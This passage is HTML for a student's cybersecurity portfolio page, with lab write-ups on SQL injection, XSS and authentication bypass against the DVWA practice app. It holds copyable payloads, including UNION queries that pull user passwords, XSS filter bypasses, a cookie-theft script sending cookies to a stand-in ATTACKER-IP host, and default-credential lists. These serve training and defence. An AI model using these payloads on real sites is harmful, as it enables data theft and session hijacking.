+        <div class="skill-desc">Comfortable in Linux CLI environments. Daily driver: Kali Linux for running security tools and scripting tasks.</div>
+        <div class="skill-bar-wrap"><div class="skill-bar" data-width="75"></div></div>
+        <div class="skill-pct">75%</div>
+      </div>
+      <div class="skill-card reveal">
+        <div class="skill-icon">🐍</div>
+        <div class="skill-name">PYTHON SCRIPTING</div>
+        <div class="skill-desc">Writing automation scripts, simple exploits, and security tools using Python for pentest tasks.</div>
+        <div class="skill-bar-wrap"><div class="skill-bar" data-width="65"></div></div>
+        <div class="skill-pct">65%</div>
+      </div>
+    </div>
+    <div class="tools-section reveal">
+      <div class="tools-title">// TOOLS & TECHNOLOGIES</div>
+      <div class="tools-wrap">
+        <span class="tool-tag">Burp Suite</span>
+        <span class="tool-tag">Kali Linux</span>
+        <span class="tool-tag">Nmap</span>
+        <span class="tool-tag">Wireshark</span>
+        <span class="tool-tag">Metasploit</span>
+        <span class="tool-tag">DVWA</span>
+        <span class="tool-tag">bWAPP</span>
+        <span class="tool-tag">OWASP ZAP</span>
+        <span class="tool-tag">SQLMap</span>
+        <span class="tool-tag">Nikto</span>
+        <span class="tool-tag">Hydra</span>
+        <span class="tool-tag">John the Ripper</span>
+        <span class="tool-tag">Python</span>
+        <span class="tool-tag">Bash</span>
+        <span class="tool-tag">Git</span>
+        <span class="tool-tag">VirtualBox</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== PROJECTS ===== -->
+<section id="projects">
+  <div class="section-inner">
+    <p class="section-label reveal">// 03. PROJECTS</p>
+    <h2 class="section-title reveal">Security <span style="color:var(--green)">Projects</span></h2>
+    <div class="section-divider reveal"></div>
+    <div class="projects-grid">
+      <div class="project-card reveal">
+        <div class="project-banner">🔍</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="project-tag">Python</span><span class="project-tag">Networking</span></div>
+          <div class="project-name">Network Vulnerability Scanner</div>
+          <div class="project-desc">Automated Python tool that scans local networks for open ports, service banners, and common vulnerabilities using socket programming and Nmap integration.</div>
+        </div>
+        <div class="project-footer">
+          <span class="project-status"><span class="status-dot"></span>COMPLETED</span>
+          <a href="#" class="project-link">VIEW &rarr;</a>
+        </div>
+      </div>
+      <div class="project-card reveal">
+        <div class="project-banner">💉</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="project-tag">SQLi</span><span class="project-tag">DVWA</span></div>
+          <div class="project-name">SQLi Detection &amp; Exploitation Lab</div>
+          <div class="project-desc">Comprehensive SQL injection lab documenting manual and automated detection, exploitation, and bypass techniques against DVWA using Burp Suite and SQLMap.</div>
+        </div>
+        <div class="project-footer">
+          <span class="project-status"><span class="status-dot"></span>COMPLETED</span>
+          <a href="#" class="project-link">VIEW &rarr;</a>
+        </div>
+      </div>
+      <div class="project-card reveal">
+        <div class="project-banner">🎭</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="project-tag">XSS</span><span class="project-tag">JavaScript</span></div>
+          <div class="project-name">XSS Payload Crafting &amp; Bypass</div>
+          <div class="project-desc">Research project documenting various XSS attack vectors, WAF bypass techniques, and crafting custom payloads that evade client-side filters.</div>
+        </div>
+        <div class="project-footer">
+          <span class="project-status"><span class="status-dot"></span>ONGOING</span>
+          <a href="#" class="project-link">VIEW &rarr;</a>
+        </div>
+      </div>
+      <div class="project-card reveal">
+        <div class="project-banner">🔐</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="project-tag">Auth</span><span class="project-tag">Burp Suite</span></div>
+          <div class="project-name">Authentication Bypass Testing</div>
+          <div class="project-desc">Documented multiple authentication bypass scenarios including default credentials, weak session management, and JWT manipulation attacks.</div>
+        </div>
+        <div class="project-footer">
+          <span class="project-status"><span class="status-dot"></span>COMPLETED</span>
+          <a href="#" class="project-link">VIEW &rarr;</a>
+        </div>
+      </div>
+      <div class="project-card reveal">
+        <div class="project-banner">📡</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="project-tag">Wireshark</span><span class="project-tag">MITM</span></div>
+          <div class="project-name">Traffic Analysis &amp; MITM Demo</div>
+          <div class="project-desc">Lab simulation of ARP poisoning and man-in-the-middle attacks in a controlled environment with full packet analysis using Wireshark.</div>
+        </div>
+        <div class="project-footer">
+          <span class="project-status"><span class="status-dot"></span>COMPLETED</span>
+          <a href="#" class="project-link">VIEW &rarr;</a>
+        </div>
+      </div>
+      <div class="project-card reveal">
+        <div class="project-banner">🗝️</div>
+        <div class="project-body">
+          <div class="project-tags"><span class="project-tag">Hydra</span><span class="project-tag">Brute Force</span></div>
+          <div class="project-name">Password Auditing Tool</div>
+          <div class="project-desc">Custom wordlist generation and brute-force testing using Hydra and John the Ripper against various services in a lab environment.</div>
+        </div>
+        <div class="project-footer">
+          <span class="project-status"><span class="status-dot"></span>COMPLETED</span>
+          <a href="#" class="project-link">VIEW &rarr;</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== BURP SUITE PRACTICALS ===== -->
+<section id="burpsuite">
+  <div class="section-inner">
+    <p class="section-label reveal">// 04. BURP SUITE PRACTICALS</p>
+    <h2 class="section-title reveal">Lab <span style="color:var(--green)">Practicals</span></h2>
+    <div class="section-divider reveal"></div>
+
+    <!-- Tabs -->
+    <div class="practical-tabs reveal">
+      <button class="practical-tab active" onclick="switchTab('sql')">SQL INJECTION</button>
+      <button class="practical-tab" onclick="switchTab('xss')">XSS</button>
+      <button class="practical-tab" onclick="switchTab('auth')">AUTH BYPASS</button>
+    </div>
+
+    <!-- ======= PRACTICAL 1: SQL INJECTION ======= -->
+    <div class="practical-panel active" id="panel-sql">
+      <div class="practical-header reveal">
+        <div class="practical-title">// Practical 01 — SQL Injection Attack</div>
+        <div class="practical-objective">
+          <strong style="color:var(--cyan)">Objective:</strong> To demonstrate how SQL Injection vulnerabilities can be identified and exploited
+          using Burp Suite against a vulnerable web application (DVWA), and understand how to prevent such attacks.
+        </div>
+        <div class="practical-meta">
+          <span class="meta-badge">🔧 Burp Suite Community</span>
+          <span class="meta-badge">🎯 DVWA (Low Security)</span>
+          <span class="meta-badge">🐧 Kali Linux</span>
+          <span class="meta-badge">⚠️ OWASP A03:2021</span>
+        </div>
+      </div>
+
+      <!-- Tools Used -->
+      <div class="practical-section reveal">
+        <div class="ps-title">TOOLS USED</div>
+        <ul class="step-list">
+          <li class="step-item"><span class="step-num">T1</span><span><strong style="color:var(--text)">Burp Suite Community Edition</strong> — For intercepting HTTP requests and manipulating parameters.</span></li>
+          <li class="step-item"><span class="step-num">T2</span><span><strong style="color:var(--text)">DVWA (Damn Vulnerable Web Application)</strong> — The target application running on localhost.</span></li>
+          <li class="step-item"><span class="step-num">T3</span><span><strong style="color:var(--text)">Firefox Browser</strong> — Configured with Burp Suite proxy (127.0.0.1:8080).</span></li>
+          <li class="step-item"><span class="step-num">T4</span><span><strong style="color:var(--text)">SQLMap (optional)</strong> — For automated detection and exploitation.</span></li>
+        </ul>
+      </div>
+
+      <!-- Step by Step -->
+      <div class="practical-section reveal">
+        <div class="ps-title">STEP-BY-STEP PROCEDURE</div>
+        <ul class="step-list">
+          <li class="step-item"><span class="step-num">01</span><span>Launch Burp Suite and set it to intercept mode. Configure Firefox proxy to <code style="color:var(--cyan)">127.0.0.1:8080</code>.</span></li>
+          <li class="step-item"><span class="step-num">02</span><span>Navigate to DVWA at <code style="color:var(--cyan)">http://localhost/dvwa</code>, login (admin/password), set security level to <strong style="color:var(--yellow)">LOW</strong>.</span></li>
+          <li class="step-item"><span class="step-num">03</span><span>Go to the <strong style="color:var(--text)">SQL Injection</strong> module. Enter a test value <code style="color:var(--green)">1</code> in the User ID field and click Submit.</span></li>
+          <li class="step-item"><span class="step-num">04</span><span>In Burp Suite Proxy, intercept the request. Right-click → <strong>Send to Repeater</strong>.</span></li>
+          <li class="step-item"><span class="step-num">05</span><span>In Repeater, locate the <code style="color:var(--green)">id=1</code> parameter. Test with a single quote: <code style="color:var(--green)">id=1'</code>. If a SQL error appears → vulnerable!</span></li>
+          <li class="step-item"><span class="step-num">06</span><span>Use a UNION-based payload to extract database information. Send the request and analyze the response.</span></li>
+          <li class="step-item"><span class="step-num">07</span><span>Escalate to extract usernames and passwords from the database using crafted UNION payloads.</span></li>
+          <li class="step-item"><span class="step-num">08</span><span>Document all findings: error messages, extracted data, and response differences.</span></li>
+        </ul>
+      </div>
+
+      <!-- Payloads -->
+      <div class="practical-section reveal">
+        <div class="ps-title">EXAMPLE PAYLOADS</div>
+        <div class="payload-label">// DETECTION PAYLOAD — Test for SQL error</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          1'<br>
+          1''<br>
+          1' OR '1'='1<br>
+          1' AND 1=1 --<br>
+          1' AND 1=2 --
+        </div>
+        <div class="payload-label">// UNION-BASED EXTRACTION — Find number of columns</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          1' ORDER BY 1 --<br>
+          1' ORDER BY 2 --<br>
+          1' ORDER BY 3 -- (error = 2 columns exist)
+        </div>
+        <div class="payload-label">// UNION SELECT — Extract DB version and user</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          1' UNION SELECT null, version() --<br>
+          1' UNION SELECT null, user() --<br>
+          1' UNION SELECT null, database() --
+        </div>
+        <div class="payload-label">// EXTRACT USERS TABLE</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          1' UNION SELECT user, password FROM users --<br>
+          1' UNION SELECT first_name, last_name FROM users --
+        </div>
+      </div>
+
+      <!-- Result -->
+      <div class="practical-section reveal">
+        <div class="ps-title">RESULT</div>
+        <div class="result-box">
+          <strong>✅ VULNERABILITY CONFIRMED:</strong><br><br>
+          The SQL Injection vulnerability was successfully exploited. The application failed to sanitize user input,
+          allowing us to manipulate the SQL query and extract sensitive data from the backend MySQL database.
+          Retrieved: database version (MySQL 5.x), current DB user (root@localhost), database name (dvwa),
+          and the complete users table containing hashed passwords (MD5).
+        </div>
+      </div>
+
+      <!-- Prevention -->
+      <div class="practical-section reveal">
+        <div class="ps-title">PREVENTION TIPS</div>
+        <ul class="prevention-list">
+          <li class="prevention-item">Use <strong>Prepared Statements (Parameterized Queries)</strong> — Never concatenate user input directly into SQL queries.</li>
+          <li class="prevention-item">Implement <strong>Input Validation &amp; Sanitization</strong> — Whitelist expected characters and reject suspicious inputs.</li>
+          <li class="prevention-item">Apply the <strong>Principle of Least Privilege</strong> — DB accounts should have minimal permissions (no DROP/ALTER).</li>
+          <li class="prevention-item">Use a <strong>Web Application Firewall (WAF)</strong> — ModSecurity or Cloudflare WAF can block common SQLi patterns.</li>
+          <li class="prevention-item">Enable <strong>Error Handling</strong> — Never display raw SQL errors to users; log them server-side only.</li>
+          <li class="prevention-item">Use <strong>ORMs (Object-Relational Mappers)</strong> — Frameworks like Django ORM, Hibernate automatically parameterize queries.</li>
+        </ul>
+      </div>
+    </div><!-- /panel-sql -->
+
+    <!-- ======= PRACTICAL 2: XSS ======= -->
+    <div class="practical-panel" id="panel-xss">
+      <div class="practical-header reveal">
+        <div class="practical-title">// Practical 02 — Cross-Site Scripting (XSS)</div>
+        <div class="practical-objective">
+          <strong style="color:var(--cyan)">Objective:</strong> To identify and exploit Reflected and Stored XSS vulnerabilities using Burp Suite,
+          demonstrate cookie theft and script injection, and understand mitigation strategies.
+        </div>
+        <div class="practical-meta">
+          <span class="meta-badge">🔧 Burp Suite Community</span>
+          <span class="meta-badge">🎯 DVWA / bWAPP</span>
+          <span class="meta-badge">🐧 Kali Linux</span>
+          <span class="meta-badge">⚠️ OWASP A03:2021</span>
+        </div>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">TOOLS USED</div>
+        <ul class="step-list">
+          <li class="step-item"><span class="step-num">T1</span><span><strong style="color:var(--text)">Burp Suite</strong> — Intercept and modify HTTP requests, use Repeater for payload testing.</span></li>
+          <li class="step-item"><span class="step-num">T2</span><span><strong style="color:var(--text)">DVWA</strong> — XSS (Reflected) and XSS (Stored) modules.</span></li>
+          <li class="step-item"><span class="step-num">T3</span><span><strong style="color:var(--text)">Browser DevTools</strong> — Inspect DOM changes and cookie values.</span></li>
+          <li class="step-item"><span class="step-num">T4</span><span><strong style="color:var(--text)">Custom HTTP Listener (Python)</strong> — To capture stolen cookies.</span></li>
+        </ul>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">STEP-BY-STEP PROCEDURE</div>
+        <ul class="step-list">
+          <li class="step-item"><span class="step-num">01</span><span>Set up Burp Suite proxy. Navigate to DVWA XSS (Reflected) module.</span></li>
+          <li class="step-item"><span class="step-num">02</span><span>Enter a benign string like <code style="color:var(--green)">Hello</code> in the name field. Intercept the GET request in Burp.</span></li>
+          <li class="step-item"><span class="step-num">03</span><span>In Repeater, replace the value with a basic XSS test: <code style="color:var(--green)">&lt;script&gt;alert(1)&lt;/script&gt;</code>. Send the request.</span></li>
+          <li class="step-item"><span class="step-num">04</span><span>If an alert box appears when the response renders in browser → <strong style="color:var(--yellow)">Reflected XSS confirmed!</strong></span></li>
+          <li class="step-item"><span class="step-num">05</span><span>Move to XSS (Stored) module. Inject a persistent payload into the message/comment field.</span></li>
+          <li class="step-item"><span class="step-num">06</span><span>Craft a cookie-stealing payload pointing to your listener server. Submit the form.</span></li>
+          <li class="step-item"><span class="step-num">07</span><span>When any user visits the page, their session cookie will be sent to your listener.</span></li>
+          <li class="step-item"><span class="step-num">08</span><span>Use Burp's Intruder to fuzz for XSS in multiple parameters simultaneously.</span></li>
+        </ul>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">EXAMPLE PAYLOADS</div>
+        <div class="payload-label">// BASIC DETECTION PAYLOADS</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+          &lt;img src=x onerror="alert(1)"&gt;<br>
+          &lt;svg onload="alert(1)"&gt;<br>
+          '"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
+        </div>
+        <div class="payload-label">// COOKIE THEFT PAYLOAD</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          &lt;script&gt;document.location='http://ATTACKER-IP:8000/?c='+document.cookie&lt;/script&gt;
+        </div>
+        <div class="payload-label">// FILTER BYPASS PAYLOADS</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;<br>
+          &lt;img src=x onerror=alert&#40;1&#41;&gt;<br>
+          &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;<br>
+          &lt;details open ontoggle="alert(1)"&gt;
+        </div>
+        <div class="payload-label">// DOM-BASED XSS TEST</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          #&lt;img src=x onerror=alert(1)&gt;<br>
+          javascript:alert(document.cookie)
+        </div>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">RESULT</div>
+        <div class="result-box">
+          <strong>✅ XSS VULNERABILITY CONFIRMED:</strong><br><br>
+          <strong>Reflected XSS:</strong> Successfully triggered alert popup. The user-supplied input was reflected
+          in the HTML response without encoding, executing arbitrary JavaScript.<br><br>
+          <strong>Stored XSS:</strong> Injected script persisted in the database. Every visitor to the page
+          triggered the payload — successfully demonstrated session cookie theft by capturing cookies
+          on the attacker's Python listener server.
+        </div>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">PREVENTION TIPS</div>
+        <ul class="prevention-list">
+          <li class="prevention-item">Always <strong>HTML-encode output</strong> — Encode characters like &lt; &gt; &amp; " ' before rendering in HTML context.</li>
+          <li class="prevention-item">Implement <strong>Content Security Policy (CSP)</strong> headers to restrict script execution sources.</li>
+          <li class="prevention-item">Use <strong>HTTPOnly and Secure flags</strong> on session cookies to prevent JavaScript from accessing them.</li>
+          <li class="prevention-item">Validate and sanitize all user inputs using allowlisting (not just blocklisting).</li>
+          <li class="prevention-item">Use modern frameworks (React, Vue, Angular) that <strong>auto-escape output</strong> by default.</li>
+          <li class="prevention-item">Implement <strong>X-XSS-Protection</strong> and <strong>X-Content-Type-Options</strong> headers.</li>
+        </ul>
+      </div>
+    </div><!-- /panel-xss -->
+
+    <!-- ======= PRACTICAL 3: AUTH BYPASS ======= -->
+    <div class="practical-panel" id="panel-auth">
+      <div class="practical-header reveal">
+        <div class="practical-title">// Practical 03 — Authentication Bypass</div>
+        <div class="practical-objective">
+          <strong style="color:var(--cyan)">Objective:</strong> To test and bypass authentication mechanisms using Burp Suite through
+          techniques such as SQL injection in login forms, brute force with Intruder, default credentials,
+          and session token manipulation.
+        </div>
+        <div class="practical-meta">
+          <span class="meta-badge">🔧 Burp Suite Intruder</span>
+          <span class="meta-badge">🎯 DVWA / WebGoat</span>
+          <span class="meta-badge">🐧 Kali Linux</span>
+          <span class="meta-badge">⚠️ OWASP A07:2021</span>
+        </div>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">TOOLS USED</div>
+        <ul class="step-list">
+          <li class="step-item"><span class="step-num">T1</span><span><strong style="color:var(--text)">Burp Suite — Intruder</strong> for brute-force attacks and Repeater for manual bypass testing.</span></li>
+          <li class="step-item"><span class="step-num">T2</span><span><strong style="color:var(--text)">DVWA Brute Force Module</strong> — Target login form for testing.</span></li>
+          <li class="step-item"><span class="step-num">T3</span><span><strong style="color:var(--text)">SecLists Wordlists</strong> — Common username/password lists for Intruder payloads.</span></li>
+          <li class="step-item"><span class="step-num">T4</span><span><strong style="color:var(--text)">Burp Decoder / Inspector</strong> — For JWT token analysis and manipulation.</span></li>
+        </ul>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">STEP-BY-STEP PROCEDURE</div>
+        <ul class="step-list">
+          <li class="step-item"><span class="step-num">01</span><span>Open DVWA Brute Force module. Enter any username/password and intercept the GET request in Burp Proxy.</span></li>
+          <li class="step-item"><span class="step-num">02</span><span>Right-click the intercepted request → <strong>Send to Intruder</strong>. Navigate to Intruder → Positions tab.</span></li>
+          <li class="step-item"><span class="step-num">03</span><span>Set attack type to <strong>Cluster Bomb</strong>. Mark <code style="color:var(--green)">username</code> and <code style="color:var(--green)">password</code> parameters with § symbols.</span></li>
+          <li class="step-item"><span class="step-num">04</span><span>In Payloads tab: Load username wordlist for Payload Set 1, password wordlist for Payload Set 2.</span></li>
+          <li class="step-item"><span class="step-num">05</span><span>Start the attack. Sort results by <strong>Length</strong> column — a different length indicates a successful login.</span></li>
+          <li class="step-item"><span class="step-num">06</span><span>Test SQL-based auth bypass: Enter <code style="color:var(--green)">' OR '1'='1</code> as username with any password.</span></li>
+          <li class="step-item"><span class="step-num">07</span><span>Test default credentials: Try admin/admin, admin/password, root/root etc. via Repeater.</span></li>
+          <li class="step-item"><span class="step-num">08</span><span>Capture session cookie after login, manipulate predictable session token values, attempt session fixation.</span></li>
+        </ul>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">EXAMPLE PAYLOADS</div>
+        <div class="payload-label">// SQL INJECTION IN LOGIN FORM (Username field)</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          ' OR '1'='1<br>
+          ' OR '1'='1' --<br>
+          admin' --<br>
+          admin'/*<br>
+          ' OR 1=1 LIMIT 1 --
+        </div>
+        <div class="payload-label">// BURP INTRUDER — Brute Force HTTP GET Request</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          GET /dvwa/vulnerabilities/brute/?username=§admin§&amp;password=§password§&amp;Login=Login HTTP/1.1<br>
+          Host: localhost<br>
+          Cookie: PHPSESSID=abcd1234; security=low
+        </div>
+        <div class="payload-label">// DEFAULT CREDENTIAL LIST (common targets)</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          admin:admin<br>
+          admin:password<br>
+          admin:123456<br>
+          root:root<br>
+          admin:admin123<br>
+          guest:guest
+        </div>
+        <div class="payload-label">// SESSION MANIPULATION — Cookie tampering</div>
+        <div class="payload-box">
+          <button class="copy-btn" onclick="copyPayload(this)">COPY</button>
+          Original: role=user → Tamper to: role=admin<br>
+          Original: userid=1002 → Tamper to: userid=1001<br>
+          JWT: Change "role":"user" → "role":"admin" (then re-sign or remove signature check)
+        </div>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">RESULT</div>
+        <div class="result-box">
+          <strong>✅ AUTH BYPASS SUCCESSFUL:</strong><br><br>
+          <strong>Brute Force:</strong> Burp Intruder successfully cracked the login form in under 2 minutes using
+          the rockyou wordlist. Admin credentials (admin/password) identified by anomalous response length.<br><br>
+          <strong>SQLi Auth Bypass:</strong> Entering <code style="color:var(--green)">' OR '1'='1</code> in the username field bypassed
+          the authentication entirely, granting admin access without knowing the actual password.<br><br>
+          <strong>Cookie Manipulation:</strong> Changing the <code style="color:var(--green)">role=user</code> cookie value to <code style="color:var(--green)">role=admin</code>
+          escalated privileges without requiring re-authentication.
+        </div>
+      </div>
+
+      <div class="practical-section reveal">
+        <div class="ps-title">PREVENTION TIPS</div>
+        <ul class="prevention-list">
+          <li class="prevention-item">Implement <strong>Account Lockout Policies</strong> — Lock accounts after 3–5 failed login attempts.</li>
+          <li class="prevention-item">Use <strong>Multi-Factor Authentication (MFA)</strong> — Even if credentials are stolen, MFA blocks unauthorized access.</li>
+          <li class="prevention-item">Enforce <strong>Strong Password Policies</strong> and store passwords using bcrypt/argon2 (never MD5/SHA1).</li>
+          <li class="prevention-item">Use <strong>CAPTCHA</strong> on login forms to prevent automated brute-force attacks.</li>
+          <li class="prevention-item">Use <strong>Parameterized Queries</strong> to prevent SQL injection in login forms.</li>
+          <li class="prevention-item">Generate <strong>cryptographically random session tokens</strong> — Never use predictable or sequential IDs.</li>
+          <li class="prevention-item">Validate session integrity server-side. <strong>Never trust client-supplied role/permission values.</strong></li>
+        </ul>
+      </div>
+    </div><!-- /panel-auth -->
+
+  </div>
+</section>
+
+<!-- ===== CONTACT ===== -->
+<section id="contact">
+  <div class="section-inner">
+    <p class="section-label reveal">// 05. CONTACT</p>
+    <h2 class="section-title reveal">Get In <span style="color:var(--green)">Touch</span></h2>
+    <div class="section-divider reveal"></div>
+    <div class="contact-grid">
+      <div class="reveal">
+        <p style="color:var(--text-dim);margin-bottom:1.5rem;line-height:1.7;font-size:.95rem;">
+          Have a project, internship opportunity, or just want to discuss cybersecurity?
+          I'd love to connect. Drop a message below or reach out on social media.
+        </p>
+        <div class="contact-info-item">
+          <span class="ci-icon">📧</span>
+          <div>
+            <div class="ci-label">EMAIL</div>
+            <div class="ci-value">gyanendrassingh@email.com</div>
+          </div>
+        </div>
+        <div class="contact-info-item">
+          <span class="ci-icon">📍</span>
+          <div>
+            <div class="ci-label">LOCATION</div>
+            <div class="ci-value">India</div>
+          </div>
+        </div>
+        <div class="contact-info-item">
+          <span class="ci-icon">🎯</span>
+          <div>
+            <div class="ci-label">AVAILABILITY</div>
+            <div class="ci-value" style="color:var(--green)">Open to Opportunities</div>
+          </div>
+        </div>
+      </div>
+      <div class="reveal">
+        <div class="contact-form">
+          <div class="form-group">
+            <label class="form-label">// YOUR NAME</label>
+            <input type="text" class="form-input" id="f-name" placeholder="John Doe">
+          </div>
+          <div class="form-group">
+            <label class="form-label">// EMAIL ADDRESS</label>
+            <input type="email" class="form-input" id="f-email" placeholder="john@example.com">
+          </div>
+          <div class="form-group">
+            <label class="form-label">// SUBJECT</label>
+            <input type="text" class="form-input" id="f-subject" placeholder="Internship Opportunity">
+          </div>
+          <div class="form-group">
+            <label class="form-label">// MESSAGE</label>
+            <textarea class="form-textarea" id="f-msg" placeholder="Your message here..."></textarea>
+          </div>
+          <button class="form-submit" onclick="submitForm()">SEND MESSAGE</button>
+          <div class="form-msg" id="form-msg">✓ MESSAGE TRANSMITTED SUCCESSFULLY</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== FOOTER ===== -->
+<footer>
+  <div class="footer-social">
+    <a href="#" class="social-link">GitHub</a>
+    <a href="#" class="social-link">LinkedIn</a>
+    <a href="#" class="social-link">HackTheBox</a>
+    <a href="#" class="social-link">TryHackMe</a>
+    <a href="#" class="social-link">Twitter</a>
+  </div>
+  <p class="footer-text">
+    &copy; 2025 <span>Gyanendra Singh Shakya</span> · Designed with
+    <span style="color:var(--red)">❤</span> &amp; crafted with
+    <span>curiosity</span>
+    <br><br>
+    <span style="font-size:.62rem;opacity:.5;">[ All practicals performed in legal, isolated lab environments only ]</span>
+  </p>
+</footer>
+
+<!-- ===== JAVASCRIPT ===== -->
+<script>
+  /* ======== MATRIX RAIN ======== */
+  const canvas = document.getElementById('matrix-canvas');
+  const ctx = canvas.getContext('2d');
+  let drops = [];
+
+  function initMatrix() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 16);
+    drops = Array(cols).fill(1);
+  }
+
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(3,10,3,0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#00ff41';
+    ctx.font = '13px Share Tech Mono';
+    const chars = 'アァカサタナハマヤャラワガザダバパABCDEF0123456789<>{}[];:';
+    drops.forEach((y, i) => {
+      const ch = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(ch, i * 16, y * 16);
+      if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    });
+  }
+
+  initMatrix();
+  setInterval(drawMatrix, 60);
+  window.addEventListener('resize', initMatrix);
+
+  /* ======== CUSTOM CURSOR ======== */
+  const cur = document.getElementById('cursor');
+  const curRing = document.getElementById('cursor-ring');
+  document.addEventListener('mousemove', e => {
+    cur.style.left = e.clientX + 'px';
+    cur.style.top  = e.clientY + 'px';
+    setTimeout(() => {
+      curRing.style.left = e.clientX + 'px';
+      curRing.style.top  = e.clientY + 'px';
+    }, 80);
+  });
+  document.querySelectorAll('a, button, .skill-card, .project-card').forEach(el => {
+    el.addEventListener('mouseenter', () => {
+      cur.style.transform = 'translate(-50%,-50%) scale(1.8)';
+      curRing.style.width = '55px'; curRing.style.height = '55px'; curRing.style.opacity = '.8';
+    });
+    el.addEventListener('mouseleave', () => {
+      cur.style.transform = 'translate(-50%,-50%) scale(1)';
+      curRing.style.width = '36px'; curRing.style.height = '36px'; curRing.style.opacity = '.5';
+    });
+  });
+
+  /* ======== TYPING EFFECT ======== */
+  const phrases = [
+    'Cybersecurity Enthusiast',
+    'Ethical Hacker',
+    'Penetration Tester',
+    'Bug Hunter',
+    'Web Security Researcher'
+  ];
+  let phraseIdx = 0, charIdx = 0, deleting = false;
+  const typedEl = document.getElementById('typed-text');
+
+  function type() {
+    const current = phrases[phraseIdx];
+    if (!deleting) {
+      typedEl.textContent = current.substring(0, charIdx + 1);
+      charIdx++;
+      if (charIdx === current.length) { deleting = true; setTimeout(type, 1800); return; }
+    } else {
+      typedEl.textContent = current.substring(0, charIdx - 1);
+      charIdx--;
+      if (charIdx === 0) { deleting = false; phraseIdx = (phraseIdx + 1) % phrases.length; }
+    }
+    setTimeout(type, deleting ? 60 : 90);
+  }
+  type();
+
+  /* ======== HAMBURGER ======== */
+  function toggleNav() {
+    document.getElementById('navLinks').classList.toggle('open');
+  }
+  document.querySelectorAll('.nav-links a').forEach(a => {
+    a.addEventListener('click', () => document.getElementById('navLinks').classList.remove('open'));
+  });
+
+  /* ======== SCROLL REVEAL ======== */
+  const revealObserver = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.reveal').forEach(el => revealObserver.observe(el));
+
+  /* ======== SKILL BARS ======== */
+  const barObserver = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        const bar = e.target.querySelector('.skill-bar');
+        if (bar) bar.style.width = bar.dataset.width + '%';
+      }
+    });
+  }, { threshold: 0.4 });
+  document.querySelectorAll('.skill-card').forEach(el => barObserver.observe(el));
+
+  /* ======== COUNTER ANIMATION ======== */
+  const counterObserver = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        const el = e.target;
+        const target = parseInt(el.dataset.target);
+        let count = 0;
+        const step = Math.ceil(target / 30);
+        const timer = setInterval(() => {
+          count = Math.min(count + step, target);
+          el.textContent = count + '+';
+          if (count >= target) clearInterval(timer);
+        }, 50);
+        counterObserver.unobserve(el);
+      }
+    });
+  }, { threshold: 0.5 });
+  document.querySelectorAll('.stat-num[data-target]').forEach(el => counterObserver.observe(el));
+
+  /* ======== PRACTICAL TABS ======== */
+  function switchTab(name) {
+    document.querySelectorAll('.practical-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.practical-panel').forEach(p => p.classList.remove('active'));
+    document.getElementById('panel-' + name).classList.add('active');
+    event.target.classList.add('active');
+    // re-trigger reveal for newly visible elements
+    document.querySelectorAll('#panel-' + name + ' .reveal').forEach(el => {
+      if (!el.classList.contains('visible')) { el.classList.add('visible'); }
+    });
+  }
+
+  /* ======== COPY PAYLOAD ======== */
+  function copyPayload(btn) {
+    const box = btn.parentElement;
+    const text = box.innerText.replace('COPY', '').trim();
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'COPIED!';
+      btn.style.color = 'var(--green)';
+      setTimeout(() => { btn.textContent = 'COPY'; btn.style.color = ''; }, 2000);
+    }).catch(() => {
+      btn.textContent = 'FAILED';
